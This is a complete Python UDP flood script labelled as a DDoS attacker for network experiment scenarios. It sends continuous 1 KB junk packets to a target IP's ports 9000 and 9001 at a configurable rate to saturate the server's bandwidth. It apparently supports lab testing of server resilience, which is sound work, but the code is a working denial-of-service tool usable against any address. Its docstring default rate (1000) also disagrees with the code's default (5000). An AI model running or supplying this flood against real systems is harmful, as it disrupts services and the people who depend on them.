"""
attacker.py — DDoS flood attacker for experiment scenarios.

Sends a continuous flood of UDP packets to the server's data port (9000 for
3.1) and NACK port (9001 for 3.2) to saturate the server's receive bandwidth.

Env vars:
  TARGET_IP    IP of the server to flood
  DURATION     seconds to run  (default 30)
  FLOOD_RATE   packets per second  (default 1000)
  LABEL        log prefix  (default 'attacker')
"""

import os
import socket
import struct
import sys
import time

TARGET_IP  = os.environ.get('TARGET_IP', '')
DURATION   = float(os.environ.get('DURATION', '30'))
FLOOD_RATE = int(os.environ.get('FLOOD_RATE', '5000'))
LABEL      = os.environ.get('LABEL', 'attacker')

# Flood both ports used by 3.1 and 3.2
TARGET_PORTS = [9000, 9001]

# 1 KB of junk payload — large enough to consume real bandwidth
JUNK_PAYLOAD = os.urandom(1024)


def run_attacker(target_ip):
    # type: (str) -> None
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 0))   # bind to attacker's own IP

    interval   = 1.0 / FLOOD_RATE
    deadline   = time.time() + DURATION
    sent       = 0
    port_cycle = 0

    print("[{}] Flooding {} at {} pps for {}s".format(
        LABEL, target_ip, FLOOD_RATE, DURATION
    ))

    while time.time() < deadline:
        port = TARGET_PORTS[port_cycle % len(TARGET_PORTS)]
        try:
            sock.sendto(JUNK_PAYLOAD, (target_ip, port))
            sent += 1
        except OSError:
            pass
        port_cycle += 1
        time.sleep(interval)

    sock.close()
    print("[{}] Done. Sent {} flood packets ({} KB).".format(
        LABEL, sent, sent * len(JUNK_PAYLOAD) // 1024
    ))


if __name__ == '__main__':
    if len(sys.argv) < 2 and not TARGET_IP:
        print("Usage: python3 attacker.py TARGET_IP")
        sys.exit(1)
    target = sys.argv[1] if len(sys.argv) > 1 else TARGET_IP
    run_attacker(target)
